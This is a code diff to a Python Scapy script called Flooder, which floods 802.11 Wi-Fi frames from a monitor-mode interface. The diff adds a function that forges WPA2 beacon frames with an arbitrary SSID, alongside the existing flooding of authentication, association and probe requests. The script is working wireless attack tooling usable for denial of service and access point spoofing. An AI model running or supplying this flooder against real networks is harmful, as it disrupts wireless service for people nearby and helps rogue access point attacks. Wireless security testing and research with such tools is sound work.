@@ -19,6 +19,7 @@ class Flooder:
             "authReq": self.authReqSender,
             "assocReq": self.assocReqSender,
             "probeReq": self.probeReqSender,
+            "beacon": self.beaconSender,
         }
 
         self.source_addr = args["source_address"]
@@ -65,11 +66,42 @@ class Flooder:
         sendp(frame, iface=self.interface, count=self.count)
 
 
+    def beaconSender(self):
+        beacon = Dot11Beacon(cap='ESS+privacy')
+        dot11elt = Dot11Elt(ID='SSID',info=self.ssid, len=len(self.ssid))
+        rsn = Dot11Elt(ID='RSNinfo', info=(
+        '\x01\x00'
+        '\x00\x0f\xac\x02'
+        '\x02\x00'
+        '\x00\x0f\xac\x04'
+        '\x00\x0f\xac\x02'
+        '\x01\x00'
+        '\x00\x0f\xac\x02'
+        '\x00\x00'))
+
+        # RSN infos: taken from -> https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
+        # rsn = Dot11Elt(ID='RSNinfo', info=(
+        # '\x01\x00'              #RSN Version 1
+        # '\x00\x0f\xac\x02'      #Group Cipher Suite : 00-0f-ac TKIP
+        # '\x02\x00'              #2 Pairwise Cipher Suites (next two lines)
+        # '\x00\x0f\xac\x04'      #AES Cipher
+        # '\x00\x0f\xac\x02'      #TKIP Cipher
+        # '\x01\x00'              #1 Authentication Key Managment Suite (line below)
+        # '\x00\x0f\xac\x02'      #Pre-Shared Key
+        # '\x00\x00'))            #RSN Capabilities (no extra capabilities)
+
+        frame = RadioTap()/self.dot11/beacon/dot11elt/rsn
+        sendp(frame, iface=self.interface, count=self.count)
+
+
+        
+
+
 if __name__ == '__main__':
     argparser = argparse.ArgumentParser(description='Flood 802.11 packets.')
     argparser.add_argument("-src", "--source_address", help="Source MAC address of the packet: '00:00:00:00:00:00' ", required=True)
     argparser.add_argument("-dst", "--destination_address", help="Destination MAC address of the packet: '11:11:11:11:11:11", required=True)
-    argparser.add_argument("-p", "--packet_type", help="Type of the 802.11 packet.", choices=["authReq", "assocReq", "probeReq"],required=True)
+    argparser.add_argument("-p", "--packet_type", help="Type of the 802.11 packet.", choices=["authReq", "assocReq", "probeReq", "beacon"],required=True)
     argparser.add_argument("-c", "--count", help="Number of packets to sent.", default=1, type=int)
     argparser.add_argument("-i", "--interface", help="Interface (must be in monitor mode).", required=True)
     argparser.add_argument("-ssid", "--ssid", help="(AssocReq) SSID of target AP: 'ILoveYou' ")
